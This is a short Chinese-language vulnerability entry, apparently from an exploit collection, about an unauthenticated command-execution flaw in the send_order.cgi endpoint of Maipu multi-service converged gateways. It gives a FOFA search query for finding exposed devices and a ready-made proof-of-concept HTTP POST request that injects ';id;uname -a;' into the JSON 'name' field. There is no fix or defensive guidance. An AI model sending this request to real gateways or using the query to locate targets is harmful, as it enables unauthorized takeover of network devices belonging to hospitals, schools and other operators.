## 迈普多业务融合网关send_order.cgi存在命令执行漏洞

迈普多业务融合网关是迈普通信技术股份有限公司自主研发的多业务无线融合网关，拥有融合网关功能、精准流控、上网行为管理、智能选路…等强大功能，并支持对接迈普云平台，实现远程运维和集中管理，很好的满足了医疗/教育等场景要求的全面一体化的网络需求。迈普多业务融合网关send_order.cgi存在命令执行漏洞，未经身份验证的远程攻击者可利用此漏洞执行任意系统指令，从而获取服务器权限。

## fofa

```
title=="迈普多业务融合网关"
```

## poc

```
POST /send_order.cgi?parameter=operation HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64MHhzZWM=; x64; rv:99.0) Gecko/20100101 Firefox/99.0
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
 
{"opid":"1","name":";id;uname -a;","type":"rest"}
```

